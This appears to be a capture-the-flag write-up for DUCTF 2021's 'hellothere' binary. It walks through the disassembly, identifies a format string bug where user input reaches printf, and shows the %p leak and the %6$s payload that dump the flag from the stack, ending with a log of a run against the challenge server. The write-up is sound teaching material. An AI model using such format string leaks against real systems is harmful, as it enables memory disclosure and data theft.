For this challenge, we are presented with a single binary named "hellothere". When we run it, we are prompted to enter a name and upon doing so are greeted and then asked to enter a name again. The process repeats in a loop.

```
$ ./hellothere 
What is your name?
name

Hello there, name

What is your name?
```

Here's the disassembly of the main() function.

```asm
┌ 196: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_60h @ rbp-0x60
│           ; var file*stream @ rbp-0x58
│           ; var char *format @ rbp-0x50
│           ; var char *s @ rbp-0x30
│           ; var int64_t var_8h @ rbp-0x8
│           0x000011d8      55             push rbp
│           0x000011d9      4889e5         mov rbp, rsp
│           0x000011dc      4883ec60       sub rsp, 0x60
│           0x000011e0      64488b042528.  mov rax, qword fs:[0x28]
│           0x000011e9      488945f8       mov qword [var_8h], rax
│           0x000011ed      31c0           xor eax, eax
│           0x000011ef      488d45d0       lea rax, [s]
│           0x000011f3      488945a0       mov qword [var_60h], rax
│           0x000011f7      b800000000     mov eax, 0
│           0x000011fc      e894ffffff     call sym.buffer_init
│           0x00001201      488d35000e00.  lea rsi, [0x00002008]       ; "r" ; const char *mode
│           0x00001208      488d3dfb0d00.  lea rdi, str.._flag.txt     ; 0x200a ; "./flag.txt" ; const char *filename
│           0x0000120f      e86cfeffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
│           0x00001214      488945a8       mov qword [stream], rax
│           0x00001218      48837da800     cmp qword [stream], 0
│       ┌─< 0x0000121d      7516           jne 0x1235
│       │   0x0000121f      488d3df20d00.  lea rdi, str.The_flag_file_isnt_loading._Please_contact_an_organiser_if_you_are_running_this_on_the_shell_server. ; 0x2018 ; "The flag file isn't loading. Please contact an organiser if you are running this on the shell server." ; const char *s
│       │   0x00001226      e815feffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x0000122b      bf00000000     mov edi, 0                  ; int status
│       │   0x00001230      e85bfeffff     call sym.imp.exit           ; void exit(int status)
│       │   ; CODE XREF from main @ 0x121d
│       └─> 0x00001235      488b55a8       mov rdx, qword [stream]     ; FILE *stream
│           0x00001239      488d45d0       lea rax, [s]
│           0x0000123d      be20000000     mov esi, 0x20               ; "@" ; int size
│           0x00001242      4889c7         mov rdi, rax                ; char *s
│           0x00001245      e826feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           ; CODE XREF from main @ 0x129a
│       ┌─> 0x0000124a      488d3d2d0e00.  lea rdi, str.What_is_your_name_ ; 0x207e ; "What is your name?" ; const char *s
│       ╎   0x00001251      e8eafdffff     call sym.imp.puts           ; int puts(const char *s)
│       ╎   0x00001256      488b15132e00.  mov rdx, qword [obj.stdin]  ; obj.stdin_GLIBC_2.2.5
│       ╎                                                              ; [0x4070:8]=0 ; FILE *stream
│       ╎   0x0000125d      488d45b0       lea rax, [format]
│       ╎   0x00001261      be20000000     mov esi, 0x20               ; "@" ; int size
│       ╎   0x00001266      4889c7         mov rdi, rax                ; char *s
│       ╎   0x00001269      e802feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│       ╎   0x0000126e      488d3d1c0e00.  lea rdi, str._nHello_there__ ; 0x2091 ; "\nHello there, " ; const char *format
│       ╎   0x00001275      b800000000     mov eax, 0
│       ╎   0x0000127a      e8e1fdffff     call sym.imp.printf         ; int printf(const char *format)
│       ╎   0x0000127f      488d45b0       lea rax, [format]
│       ╎   0x00001283      4889c7         mov rdi, rax                ; const char *format
│       ╎   0x00001286      b800000000     mov eax, 0
│       ╎   0x0000128b      e8d0fdffff     call sym.imp.printf         ; int printf(const char *format)
│       ╎   0x00001290      bf0a000000     mov edi, 0xa                ; int c
│       ╎   0x00001295      e896fdffff     call sym.imp.putchar        ; int putchar(int c)
└       └─< 0x0000129a      ebae           jmp 0x124a

```

In the prologue we can see that it's making 96 bytes (0x60) of space on the stack and then storing a canary value at the end of that space, although this value is not used because main doesn't return. Next it stores a pointer to another buffer starting at rbp-0x30 into the reserved space. Next it calls a buffer_init() function which disables buffering on standard input, standard output, and standard error which is commonly done in these types of problems. Next it attempts to open a file (./flag.txt) and reads it into a buffer on the stack which starts at 48 bytes (0x30) into the reserved space. If the file can't be opened, it prints an error message and calls exit().

After reading the flag into the buffer, it prompts the user to enter a name and reads up to 32 bytes (0x20) of user input into a stack buffer starting at rbp-0x50. It then prints the greeting by calling printf() twice, first with a static string containing "\nHello there, " and second with the address of the buffer the user input was read into. It then calls putchar() to send a newline character.

Because the first argument to printf() is the "format string", passing unsanitized user input as the first argument to printf() can result in a format string vulnerability. In this case, we can use this vulnerability to leak the contents of the buffer which the flag file's contents were written into.

In order to do this, we need to know which numbered parameter holds the pointer to that buffer. One way to figure this out is to just send a bunch of "%p" format strings to leak pointers and use a debugger to figure out which one we're looking for. If we do that here, we get the following output:

```
What is your name?
%p %p %p %p %p %p %p %p %p %p

Hello there, 0x7fffffffb830 (nil) (nil) 0x7fffffffdec0 0xe 0x7fffffffdee0 0x5555555592a0 0x7025207025207025 0x2520702520702520 0x2070252070252070
```

If we set a breakpoint at main+184 so that we pause execution following the printf() call which is leaking data and inspect stack contents, we see the following:

```
00:0000│ rsp 0x7fffffffdeb0 —▸ 0x7fffffffdee0 ◂— 'flag{placeholder}\n'
01:0008│     0x7fffffffdeb8 —▸ 0x5555555592a0 ◂— 0xfbad2488
02:0010│     0x7fffffffdec0 ◂— '%p %p %p %p %p %p %p %p %p %p\n'
03:0018│     0x7fffffffdec8 ◂— ' %p %p %p %p %p %p %p\n'
04:0020│     0x7fffffffded0 ◂— 'p %p %p %p %p\n'
```

In this case, I created a "placeholder" flag so that I could develop and test the exploit locally. We can see that the flag file contents were read into a buffer at 0x7fffffffdee0. If we count from the first pointer leak, until we find that address, we can see that it's positional parameter six. We can leak the sixth positional parameter by sending a format string of %6$s.

Here's the output when run against the challenge server:

```
$ python hellothere.py REMOTE
[+] Opening connection to pwn-2021.duc.tf on port 31918: Done
[*] Switching to interactive mode

Hello there, DUCTF{f0rm4t_5p3c1f13r_m3dsg!}

What is your name?
```

